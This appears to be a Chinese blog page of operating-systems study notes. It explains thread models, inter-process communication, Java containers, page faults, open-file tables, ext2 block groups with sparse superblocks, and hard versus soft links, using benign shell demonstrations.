<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjUwNzA2YzA3YTk3OWZkNjA2OWM2ZDVkOGVlZDlhNGRfek1KVGZhU09xdlFJb0ZkR0V6OU9FMTlKQ1pUY1pyOWVfVG9rZW46UEdoZ2JCSVZBb3F0NHh4bkhJY2NnT2lGblRnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-生活例子：快递公司和公司员工">✅ <strong>生活例子</strong>：快递公司和公司员工</h2>
<p>假设你有一家公司（进程），里面有很多员工（线程）来做不同的任务。</p>
<h3 id="1-用户线程（员工自己调度自己）">1. <strong>用户线程（员工自己调度自己）</strong></h3>
<p>你公司内部用白板安排任务，员工（线程）自己决定谁先做谁后做，但国家（操作系统）并不知道有这么多人。</p>
<ul>
<li>优点：员工之间配合快（不需要找国家审批）</li>
<li>缺点：只要有一个员工堵住（比如出去办事卡住），公司整个就停摆</li>
</ul>
<p>📌 这就像用户线程：自己调度快，但一旦有阻塞，所有线程都等。</p>
<h3 id="2-内核线程（国家统一分配任务）">2. <strong>内核线程（国家统一分配任务）</strong></h3>
<p>每个员工都在国家系统注册（OS 可感知），每次要工作都要通过政府安排。</p>
<ul>
<li>优点：某个员工堵住了，国家会安排别的员工继续做别的事（线程不会互相影响）</li>
<li>缺点：调度需要流程复杂、审批（线程切换慢）</li>
</ul>
<p>📌 这就像内核线程：效率没那么快，但稳妥。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>本质</th>
<th>谁知道它的存在</th>
<th>调度由谁控制</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>用户线程</td>
<td>用户层创建的线程</td>
<td>用户程序知道，内核不知道</td>
<td>用户程序自己调度</td>
<td>Go 协程、Java 绿色线程</td>
</tr>
<tr>
<td>轻量级进程（LWP）</td>
<td>一个内核线程 + 一个用户线程的结合体</td>
<td>用户 &amp; 内核都知道</td>
<td>操作系统调度</td>
<td>Linux 下的 pthread</td>
</tr>
<tr>
<td>内核线程</td>
<td>没有用户线程对应的系统线程</td>
<td>内核知道，用户不一定知道</td>
<td>操作系统调度</td>
<td>Linux 中的内核后台任务，比如 kswapd</td>
</tr>
</tbody>
</table>
<h2 id="类比理解（团队工作）">类比理解（团队工作）</h2>
<ul>
<li><strong>用户线程</strong>：公司自己招了一批实习生（线程），外界不知情，只能自己安排，出问题全挂。</li>
<li><strong>轻量级进程</strong>：公司把实习生的信息登记到了国家就业平台（内核），出事有人管，调度也系统化。</li>
<li><strong>内核线程</strong>：直接是国家机构派来的公务员（内核线程），不属于某家公司，但处理国家事务。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE3NWNmZjcwNzFiYTMzN2NiZjZmNzNmZmIxMzQ1YmFfcTFFb1NselNDaTBqOUNGbG5PUjNIbWdzSEZzM2x1TzFfVG9rZW46VWJMaGJHMzVQb0F3OXB4T0JPeWNzdXhGblNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>进程间的通信方式</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhlYjI4ZTM5Nzg1MjhmNDQ1YmIzYTcwZmZhMTIzZmZfdXVkeHFrb2NJVE1aTWlmMGROaHRFSDQzUXFxRE1yM1FfVG9rZW46WEhXS2JHdm0zb0xNb2F4ZzNVd2NTY295bkVoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>管道（Pipe）</th>
<th>消息队列（Message Queue）</th>
</tr>
</thead>
<tbody>
<tr>
<td>定义</td>
<td>内核提供的字节流通道</td>
<td>内核中的一个消息存储链表，供多个进程收发消息</td>
</tr>
<tr>
<td>通信单位</td>
<td>字节流（无格式）</td>
<td>消息（结构化、有边界）</td>
</tr>
<tr>
<td>结构</td>
<td>单一数据流（read/write）</td>
<td>消息类型 + 消息正文</td>
</tr>
<tr>
<td>方向性</td>
<td>半双工（一个方向）</td>
<td>可双向（多个进程可互相发收）</td>
</tr>
<tr>
<td>命名能力</td>
<td>匿名管道不能命名、有名管道可命名</td>
<td>可以用 key/id 标识多个消息队列</td>
</tr>
<tr>
<td>同步能力</td>
<td>简单同步，通过阻塞 I/O 实现</td>
<td>可支持消息优先级、阻塞/非阻塞操作</td>
</tr>
<tr>
<td>适用范围</td>
<td>父子进程或血缘关系进程之间通信</td>
<td>任意多个进程间，灵活且强大</td>
</tr>
<tr>
<td>系统支持</td>
<td>所有类 Unix 系统通用</td>
<td>System V / POSIX 消息队列，部分平台可能差异</td>
</tr>
<tr>
<td>数据可靠性</td>
<td>字节流，边界不清晰</td>
<td>消息为单位，消息边界清晰、读取不丢失</td>
</tr>
<tr>
<td>实现原理</td>
<td>内核缓存区为基础，读写流机制</td>
<td>内核维护一个消息链表，消息排队等待接收</td>
</tr>
</tbody>
</table>
<p>信号量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2JhOWVhY2ZlZDZiOWYzODhmZjAxZjc4NDJhOWNiN2ZfbDhrc2d6VWpobnZDUm1HT3BhbDZ2M25EN1lvMUZ3VUZfVG9rZW46TXF2c2JLZU1Wb2VtMHd4S3F0WWNsRUNVbkljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjAyZTZiNTc1ZDI4NGY1NTFiZjQ1MzFhYjhlZTdmY2VfQXhrSVVCbUdCRjM2UTFNZlU2RThTdG5aRjNVYWpiZm9fVG9rZW46WTRDMmJOSWllb3dScXZ4TjFaNGNteExFbk5lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2Y2RlOTNkMTVlOTg0MGFkYmRlMDM3MzY2NGRjYjNfME9BTXVBZUxocGpla1RldmZHVHYyM3FxWWhsQzR1RWZfVG9rZW46S2JKUWJZNFFpb2FtaEV4c2kwVmNBMXlrbjZjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>socket（套接字）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzgwMmVlODYxOWY4YmY2ODkxMGMyOGI2MTQ1ZjFlNjlfWXFVWU9vV3Fxb3NSY1pqamFUZVJ2TG9lUkFBa3pOWlBfVG9rZW46RXhBNWJqTVljb0dZdmV4Y24xd2MzWVBQbk9mXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTFkODMyYWJlZjQwNDJiMzRkNjk2MjUyMDM0M2UzNTlfRFpxd2w3YUtDSXlwZkJsZ01WOUE4Q1lrbWNQS1cxVVFfVG9rZW46V1RDd2I4NzFkb1pLc1F4bGs4YmNnRGxsbllmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>java各种容器</h1>
<table>
<thead>
<tr>
<th>类型</th>
<th>类名</th>
<th>初始化语句（泛型为 int[] 举例）</th>
<th>特点说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>栈（后进先出）</td>
<td>Stack</td>
<td>Stack&lt;int[]&gt; stack = new Stack&lt;&gt;();</td>
<td>经典栈，线程安全（同步），较老，建议用 Deque 实现栈逻辑</td>
</tr>
<tr>
<td>栈（推荐）</td>
<td>ArrayDeque as stack</td>
<td>Deque&lt;int[]&gt; stack = new ArrayDeque&lt;&gt;();</td>
<td>更快，线程不安全，推荐用来代替 Stack</td>
</tr>
<tr>
<td>队列（先进先出）</td>
<td>LinkedList as queue</td>
<td>Queue&lt;int[]&gt; queue = new LinkedList&lt;&gt;();</td>
<td>链表队列，支持插入、删除较快</td>
</tr>
<tr>
<td>队列（高性能）</td>
<td>ArrayDeque as queue</td>
<td>Queue&lt;int[]&gt; queue = new ArrayDeque&lt;&gt;();</td>
<td>数组实现，性能更高</td>
</tr>
<tr>
<td>链表</td>
<td>LinkedList</td>
<td>LinkedList&lt;int[]&gt; list = new LinkedList&lt;&gt;();</td>
<td>双向链表，支持头尾插入删除</td>
</tr>
<tr>
<td>双端队列</td>
<td>ArrayDeque</td>
<td>ArrayDeque&lt;int[]&gt; deque = new ArrayDeque&lt;&gt;();</td>
<td>可当栈也可当队列，效率高</td>
</tr>
<tr>
<td>双端队列</td>
<td>Deque 接口</td>
<td>Deque&lt;int[]&gt; deque = new ArrayDeque&lt;&gt;();</td>
<td>推荐写法，灵活处理栈/队列逻辑</td>
</tr>
</tbody>
</table>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDliMDdkYzE3OGUwMmM3ZThjZWQyYTRhMjM1ZDY3ZjlfT0tVUWVKeEdQZHJvRUtxQVYzTzJTMVRUR2JNbU94Z0RfVG9rZW46RklFM2JZM0tCbzZaeFB4ZzVGVGNLWUVxblhnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>缺页中断和一般中断的区别</h1>
<p>缺页中断与一般中断的主要区别在于：</p>
<p>1、缺页中断在指令执行「期间」产生和处理中断信号，而一般中断在一条指令执行「完成」后检查和处理中断信号。</p>
<p>2、缺页中断返回到该指令的开始重新执行「该指令」，而一般中断返回回到该指令的「下一个指令」执行</p>
<table>
<thead>
<tr>
<th>对比项</th>
<th>缺页中断（Page Fault）</th>
<th>一般中断（如外设中断、时钟中断等）</th>
</tr>
</thead>
<tbody>
<tr>
<td>触发时机</td>
<td>指令执行过程中访问了不存在于内存的页时触发</td>
<td>一条指令执行完成之后，进入中断检查阶段时触发</td>
</tr>
<tr>
<td>中断来源</td>
<td>CPU 内部产生（访问无效页表项时）</td>
<td>多数来自外部设备（I/O 完成、时钟滴答、键盘等）</td>
</tr>
<tr>
<td>中断处理目标</td>
<td>将缺失的页调入内存（可能涉及磁盘 I/O）</td>
<td>响应外设请求，完成外设驱动任务等</td>
</tr>
<tr>
<td>中断返回位置</td>
<td>返回到发生缺页的那条指令重新执行</td>
<td>返回到中断前下一条指令继续执行</td>
</tr>
<tr>
<td>对程序可见性</td>
<td>对程序透明，程序不会察觉</td>
<td>可被程序感知（如信号处理函数），影响控制流</td>
</tr>
<tr>
<td>处理时间和复杂度</td>
<td>相对较长，可能涉及磁盘访问</td>
<td>相对较短（外设响应或简单任务）</td>
</tr>
</tbody>
</table>
<h2 id="✅-补充解释">✅ 补充解释</h2>
<h3 id="🔸-为什么缺页中断要「重新执行」那条指令？">🔸 为什么缺页中断要「重新执行」那条指令？</h3>
<ul>
<li>因为该指令<strong>在执行过程中没拿到数据</strong>，比如访问了还没调入内存的页，只有调入之后才能继续执行原始动作。</li>
<li>所以需要中断处理完毕后，<strong>重新从那条指令开始</strong>执行（而不是下一条）。</li>
</ul>
<h3 id="🔸-一般中断为什么可以从「下一条指令」执行？">🔸 一般中断为什么可以从「下一条指令」执行？</h3>
<ul>
<li>因为它不会影响原来指令的执行逻辑，属于<strong>异步中断</strong>，CPU 可以放心地处理完再继续向下执行。</li>
</ul>
<h2 id="✅-举个形象的生活例子：">✅ 举个形象的生活例子：</h2>
<h3 id="📦-缺页中断：">📦 缺页中断：</h3>
<p>你正在看书，翻到一页发现这页纸被撕掉了（缺页），你去复印店补打那一页（调页），补好后再<strong>重新看这一页内容</strong>。</p>
<h3 id="⏰-一般中断：">⏰ 一般中断：</h3>
<p>你写作业写完一道题，妈妈叫你吃饭（一般中断），你吃完饭回来，<strong>从下一题继续写</strong>，而不是把刚写的题再写一遍。</p>
<h1>操作系统在打开文件表中维护着打开文件的状态和信息：</h1>
<h4 id="1-文件指针（File-Pointer）">1. <strong>文件指针（File Pointer）</strong></h4>
<ul>
<li><strong>作用</strong>：记录进程对文件的读写位置。</li>
<li><strong>特性</strong>：
<ul>
<li>每个进程独立维护一个文件指针，指向当前操作位置（如读取或写入的偏移量）。</li>
<li>多个进程打开同一文件时，各自的文件指针互不影响。例如：
<ul>
<li>进程A读取文件的前100字节，指针移动到位置100；</li>
<li>进程B读取同一文件的后100字节，指针进行移动；</li>
<li>两者指针独立操作，互不干扰。</li>
</ul>
</li>
</ul>
</li>
<li><strong>意义</strong>：支持进程对文件的并发访问，确保操作位置的独立性。</li>
</ul>
<h4 id="2-文件打开计数器（File-Open-Counter）">2. <strong>文件打开计数器（File Open Counter）</strong></h4>
<ul>
<li><strong>作用</strong>：跟踪文件的打开次数，确保资源释放安全。</li>
<li><strong>机制</strong>：
<ul>
<li>每个文件条目在系统全局打开文件表中维护一个计数器。</li>
<li>当进程打开文件时，计数器加1；关闭文件时，计数器减1。</li>
<li><strong>计数器归零时</strong>，系统才会真正关闭文件并删除其在表中的条目。</li>
</ul>
</li>
<li><strong>示例</strong>：
<ul>
<li>进程A、B、C同时打开文件<code>data.txt</code>，计数器为3；</li>
<li>进程A和B关闭文件，计数器减为1；</li>
<li>进程C关闭文件后，计数器归零，系统释放资源。</li>
</ul>
</li>
<li><strong>意义</strong>：避免资源泄漏，确保文件被所有进程关闭后才释放。</li>
</ul>
<h4 id="3-文件磁盘位置（Disk-Location）">3. <strong>文件磁盘位置（Disk Location）</strong></h4>
<ul>
<li><strong>作用</strong>：缓存文件在磁盘上的位置信息，加速文件操作。</li>
<li><strong>实现</strong>：
<ul>
<li>文件的元数据（如磁盘块地址、大小、权限等）保存在内存中，避免每次操作访问磁盘。</li>
<li>修改文件时，先在内存中更新数据，后续由系统异步同步到磁盘（如通过缓冲区机制）。</li>
</ul>
</li>
<li><strong>示例</strong>：
<ul>
<li>进程写入文件时，数据先写入内存缓冲区；</li>
<li>操作系统定期或按策略将缓冲区内容刷回磁盘。</li>
</ul>
</li>
<li><strong>意义</strong>：减少磁盘I/O次数，提升性能。</li>
</ul>
<h4 id="4-访问权限（Access-Rights）">4. <strong>访问权限（Access Rights）</strong></h4>
<ul>
<li><strong>作用</strong>：控制进程对文件的访问权限。</li>
<li><strong>机制</strong>：
<ul>
<li>进程打开文件时需指定访问模式（如只读、读写、追加等），该信息保存在进程的私有打开文件表中。</li>
<li>操作系统根据访问模式限制后续I/O操作。</li>
</ul>
</li>
<li><strong>示例</strong>：
<ul>
<li>进程A以<strong>只读</strong>模式打开文件，尝试写入时会被系统拒绝；</li>
<li>进程B以<strong>读写</strong>模式打开同一文件，可正常写入。</li>
</ul>
</li>
<li><strong>冲突处理</strong>：
<ul>
<li>若文件已被某进程以<strong>独占模式</strong>（如写模式）打开，其他进程可能无法同时写入（取决于操作系统实现）。</li>
</ul>
</li>
<li><strong>意义</strong>：保障文件操作的合法性和安全性。</li>
</ul>
<p>读文件和写文件的过程：</p>
<ol>
<li>当用户进程从文件读取 1 个字节大小的数据时，文件系统则需要获取字节所在的数据块，再返回数据块对应的用户进程所需的数据部分。</li>
<li>当用户进程把 1 个字节大小的数据写进文件时，文件系统则找到需要写入数据的数据块的位置，然后修改数据块中对应的部分，最后再把数据块写回磁盘。</li>
</ol>
<p>所以说，文件系统的基本操作单位是数据块。</p>
<h1>文件系统的结构</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzNhZjA4YTcyYWQ2YzJiN2JkNWY1YzI4NjdkNjNjYjlfUG5OOVpmMzZZSU1iWEhJMVF4ajdjQXlUZXRlSDV5aFdfVG9rZW46VEhPVWJPMjB1b1kybmR4YjUzV2MzNkpvbkFmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="从128MB空间限制到块组设计的逻辑解析">从128MB空间限制到块组设计的逻辑解析</h3>
<ol>
<li>
<h3 id="单个块位图的容量限制"><strong>单个块位图的容量限制</strong></h3>
</li>
</ol>
<ul>
<li><strong>位图管理原理</strong>： Linux文件系统通过<strong>数据块位图</strong>和<strong>inode位图</strong>来管理空闲资源。每个位表示一个数据块或inode的空闲状态。
<ul>
<li>假设一个块大小为4KB（即4096字节），每个块位图占满一个块，则包含的位数：</li>
<li>4 KB×8 bit/byte=32,768 位4KB×8bit/byte=32,768位</li>
<li>每个位对应一个数据块（4KB），因此单个块位图可管理的最大空间为：</li>
<li>32,768 块×4 KB=128 MB32,768块×4KB=128MB</li>
<li>同理，inode位图也受限于类似的计算逻辑。</li>
</ul>
</li>
<li><strong>问题</strong>： 单个块位图只能管理128MB空间，而现代文件动辄数GB甚至TB，显然无法满足需求。</li>
</ul>
<ol>
<li>
<h3 id="块组设计的核心思想"><strong>块组设计的核心思想</strong></h3>
</li>
</ol>
<ul>
<li><strong>分治策略</strong>： Linux Ext2文件系统将整个磁盘划分为多个<strong>块组（Block Group）</strong>，每个块组独立管理自己的资源（数据块和inode）。
<ul>
<li><strong>每个块组包含</strong>：
<ul>
<li>专属的数据块位图和inode位图（仅管理本组内的块和inode）；</li>
<li>本地化的元数据（如超级块副本、块组描述符表）；</li>
<li>实际存储数据的数据块和inode列表。</li>
</ul>
</li>
</ul>
</li>
<li><strong>容量扩展逻辑</strong>：
<ul>
<li>假设每个块组仍管理128MB空间，则：</li>
<li>总容量=128 MB×块组数量 (N)总容量=128MB×块组数量(<em>N</em>)</li>
<li>例如，1000个块组可管理128GB空间，彻底突破单个位图的限制。</li>
</ul>
</li>
</ul>
<ol>
<li>
<h3 id="块组如何解决128MB限制"><strong>块组如何解决128MB限制</strong></h3>
</li>
</ol>
<h5 id="（1）分布式位图管理"><strong>（1）分布式位图管理</strong></h5>
<ul>
<li><strong>独立位图</strong>：每个块组维护自己的数据块位图和inode位图，仅需管理本组的资源（例如32,768个块）。</li>
<li><strong>资源分配</strong>：
<ul>
<li>当需要分配新文件时，系统遍历所有块组的位图，找到第一个有空闲资源的块组进行分配。</li>
<li>若某个块组的资源耗尽，系统自动切换到下一个块组，以此类推。</li>
</ul>
</li>
</ul>
<h5 id="（2）元数据冗余与性能优化"><strong>（2）元数据冗余与性能优化</strong></h5>
<ul>
<li><strong>超级块副本</strong>：每个块组保存超级块的副本（全局文件系统信息），确保即使部分块组损坏，仍能通过其他副本恢复。</li>
<li><strong>就近访问</strong>：
<ul>
<li>文件操作时优先使用当前块组的元数据，减少磁头移动（如无需从磁盘起始位置读取超级块）。</li>
<li>例如，块组2中的文件直接使用本组的位图和inode列表，无需依赖其他块组。</li>
</ul>
</li>
</ul>
<h5 id="（3）支持大文件存储"><strong>（3）支持大文件存储</strong></h5>
<ul>
<li><strong>跨块组存储</strong>：
<ul>
<li>单个大文件可跨多个块组存储。例如，一个1GB文件可能分布在8个块组中，每个块组存储128MB数据。</li>
<li>文件系统通过inode中的<strong>多级指针</strong>（直接、间接、双重间接指针）记录跨块组的数据块地址。</li>
</ul>
</li>
</ul>
<ol>
<li>
<h3 id="块组设计的实际效果"><strong>块组设计的实际效果</strong></h3>
</li>
</ol>
<ul>
<li><strong>容量扩展</strong>： 通过增加块组数量，理论上可支持任意大的磁盘容量（例如TB级）。
<ul>
<li>实际限制仅取决于块组描述符表的大小和文件系统实现。</li>
</ul>
</li>
<li><strong>性能提升</strong>：
<ul>
<li>位图更小（仅需管理本组资源），加载到内存后占用更少空间，适合早期内存受限环境（如128MB内存）。</li>
<li>本地化元数据减少磁盘寻道时间，提升读写效率。</li>
</ul>
</li>
<li><strong>可靠性增强</strong>： 冗余的超级块副本和块组描述符表，防止单点故障导致整个文件系统崩溃。</li>
</ul>
<h3 id="Linux-Ext2-文件系统块组结构详解">Linux Ext2 文件系统块组结构详解</h3>
<ol>
<li>
<h3 id="块组（Block-Group）的基本组成"><strong>块组（Block Group）的基本组成</strong></h3>
</li>
</ol>
<p>Linux Ext2 文件系统将磁盘划分为多个<strong>块组</strong>，每个块组包含以下核心结构（以块组0为例）：</p>
<p>块组0结构：</p>
<p>| 引导块 | 超级块 | 块组描述符表 | 数据块位图 | inode位图 | inode列表 | 数据块 |</p>
<ul>
<li><strong>引导块（Boot Block）</strong>： 位于文件系统起始位置，存储系统启动时的引导程序（如 GRUB），仅在块组0中存在。</li>
<li><strong>超级块（Superblock）</strong>： 记录文件系统全局信息，例如：
<ul>
<li>块大小（如 4KB）、总块数、总 inode 数；</li>
<li>每个块组的 inode 数和块数；</li>
<li>文件系统状态（如挂载次数、最后一次挂载时间）。</li>
</ul>
</li>
<li><strong>块组描述符表（Block Group Descriptor Table）</strong>： 描述所有块组的状态，例如：
<ul>
<li>每个块组的空闲块数和空闲 inode 数；</li>
<li>数据块位图、inode 位图、inode 列表的位置。</li>
</ul>
</li>
<li><strong>数据块位图（Data Block Bitmap）</strong>： 标记当前块组中哪些数据块已被占用（1 表示已用，0 表示空闲）。</li>
<li><strong>inode 位图（inode Bitmap）</strong>： 标记当前块组中哪些 inode 已被占用。</li>
<li><strong>inode 列表（inode Table）</strong>： 存储所有 inode 的元数据，例如：
<ul>
<li>文件类型（普通文件、目录、符号链接等）；</li>
<li>权限、所有者、大小；</li>
<li>文件数据块的磁盘地址（直接指针、间接指针）。</li>
</ul>
</li>
<li><strong>数据块（Data Blocks）</strong>： 存储文件的实际内容或目录条目（如文件名与 inode 的映射）。</li>
</ul>
<ol>
<li>
<h3 id="块组中重复超级块和块组描述符表的原因"><strong>块组中重复超级块和块组描述符表的原因</strong></h3>
</li>
</ol>
<p>每个块组最初都包含超级块和块组描述符表的副本，主要出于以下目的：</p>
<h5 id="原因-1：冗余备份，增强容错能力"><strong>原因 1：冗余备份，增强容错能力</strong></h5>
<ul>
<li><strong>问题</strong>：超级块和块组描述符表是文件系统的“大脑”。若仅有一个副本，一旦损坏（如磁盘坏道、意外断电），整个文件系统将无法挂载。</li>
<li><strong>解决方案</strong>：在每个块组中存储冗余副本。</li>
<li><strong>示例</strong>：
<ul>
<li>假设块组0的超级块因硬件故障损坏；</li>
<li>系统会自动检测到错误，并尝试加载块组1或其他块组的超级块副本；</li>
<li>文件系统仍能正常挂载，用户数据不受影响。</li>
</ul>
</li>
<li><strong>意义</strong>：通过冗余设计避免单点故障，提升文件系统的可靠性。</li>
</ul>
<h5 id="原因-2：减少磁头寻道时间，提升性能"><strong>原因 2：减少磁头寻道时间，提升性能</strong></h5>
<ul>
<li><strong>问题</strong>：若超级块和块组描述符表仅存在于文件系统起始位置，每次访问其他块组时，磁头需频繁移动到磁盘开头读取元数据，导致性能下降。</li>
<li><strong>解决方案</strong>：在每个块组中存储本地副本，实现就近访问。</li>
<li><strong>示例</strong>：
<ul>
<li>用户需要读取块组2中的某个文件；</li>
<li>系统直接从块组2的超级块和块组描述符表中获取元数据（如空闲块位置）；</li>
<li>无需跨越整个磁盘访问块组0，减少了磁头移动和寻道时间。</li>
</ul>
</li>
<li><strong>意义</strong>：分布式元数据存储优化了读写效率。</li>
</ul>
<ol>
<li>
<h3 id="Ext2-后续版本的改进：-稀疏超级块技术">**Ext2 后续版本的改进：**<strong>稀疏超级块技术</strong></h3>
</li>
</ol>
<p>尽管冗余设计提高了可靠性，但也带来了存储空间的浪费（尤其是大容量磁盘）。因此，Ext2 后续版本引入了**稀疏超级块（Sparse Superblock）**技术。</p>
<h5 id="稀疏技术的实现规则"><strong>稀疏技术的实现规则</strong></h5>
<p>超级块和块组描述符表仅存储在以下块组中：</p>
<ol>
<li><strong>块组0</strong>：必须包含副本；</li>
<li><strong>块组1</strong>：第一个备份；</li>
<li><strong>其他块组</strong>：仅当块组ID是 3、5、7 的幂时存储副本（如 ID=3, 5, 7, 9, 25, 27, 49 等）。</li>
</ol>
<h5 id="稀疏技术的优势"><strong>稀疏技术的优势</strong></h5>
<ul>
<li><strong>减少冗余数据占用</strong>： 例如，一个包含 1000 个块组的文件系统，传统设计需要 1000 个超级块副本，而稀疏技术可能仅需数十个。</li>
<li><strong>平衡可靠性与空间效率</strong>： 通过数学规律分布副本，确保即使部分块组损坏，仍有足够多的备份可用。</li>
</ul>
<h5 id="示例场景"><strong>示例场景</strong></h5>
<ul>
<li>假设文件系统有块组0至块组100：
<ul>
<li>超级块副本存储在块组0、1、3、5、7、9、25、27、49、81等；</li>
<li>若块组0的超级块损坏，系统可优先使用块组1的副本；</li>
<li>若块组1也损坏，则可使用块组3、5等位置的副本。</li>
</ul>
</li>
</ul>
<h1>软链接、硬链接</h1>
<p>软链接（symbolic link）和硬链接（hard link）是 Linux 文件系统中实现文件引用的两种方式，</p>
<p><strong>硬链接</strong>：多个文件名 <strong>指向同一个 inode</strong>（共享文件内容）。</p>
<p><strong>软链接</strong>：一个文件名 <strong>指向另一个文件名</strong>，是个路径引用（相当于“快捷方式”）。</p>
<h2 id="🧪-举个实际例子">🧪 举个实际例子</h2>
<p>我们先创建一个原始文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; a.txt</span><br></pre></td></tr></table></figure>
<p>然后创建：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> <span class="keyword">a</span>.txt hard.txt       <span class="comment"># 创建硬链接 ``ln -s a.txt soft.txt    # 创建软链接</span></span><br></pre></td></tr></table></figure>
<p>现在，你有 3 个文件：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>.txt     → inode <span class="number">12345</span>` `hard.txt → inode <span class="number">12345</span>   # 与 a.txt 共用 inode ``soft.txt → inode <span class="number">67890</span>   # 软链接自己一个 inode，内容是 “a.txt”</span><br></pre></td></tr></table></figure>
<h4 id="删除测试：">删除测试：</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> a.txt</span><br></pre></td></tr></table></figure>
<ul>
<li><code>hard.txt</code> 还能访问文件内容（因为 inode 还在）</li>
<li><code>soft.txt</code> 报错：<strong>No such file or directory</strong>（找不到路径）</li>
</ul>
<table>
<thead>
<tr>
<th>项目</th>
<th>硬链接（Hard Link）</th>
<th>软链接（Soft Link）</th>
</tr>
</thead>
<tbody>
<tr>
<td>指向的内容</td>
<td>直接指向 文件的 inode</td>
<td>指向 另一个文件名（路径）</td>
</tr>
<tr>
<td>是否可跨文件系统</td>
<td>❌ 否（只能在同一个文件系统内）</td>
<td>✅ 是（路径形式，可以跨磁盘）</td>
</tr>
<tr>
<td>删除源文件影响</td>
<td>❌ 不会影响（内容依然在）</td>
<td>✅ 会影响（指向路径失效，变成“悬挂链接”）</td>
</tr>
<tr>
<td>是否支持目录</td>
<td>❌ 一般不支持（防止循环）</td>
<td>✅ 支持（可对目录做软链接）</td>
</tr>
<tr>
<td>inode 是否相同</td>
<td>✅ 相同（共享 inode）</td>
<td>❌ 不同（软链接拥有独立 inode）</td>
</tr>
<tr>
<td>占用空间</td>
<td>很少（共享）</td>
<td>一点点（存储目标路径的字符串）</td>
</tr>
</tbody>
</table>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZkM2ZhNTU5MTljYzQxMDE3NTA1ZDFkYTMwYjg3OWVfU3RtTjBIOXE4OEV2WDd3Nm5KSjFZWFBTdWN0bDR0OE9fVG9rZW46S20xVWJPOEFYb1lVZ3d4TnRDZWNLa2JVbjZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgzZDUzM2EzMTFhMTMwY2Y4NjU4YjEwNzNjNmM2YjRfRW11UzAwUHIzMXd6bWtLUDcwSU5jU1NZN3BXSE5TeUZfVG9rZW46V3paUWJJeGNmb1JWaDJ4WnBHQWNHb0Nibm5iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
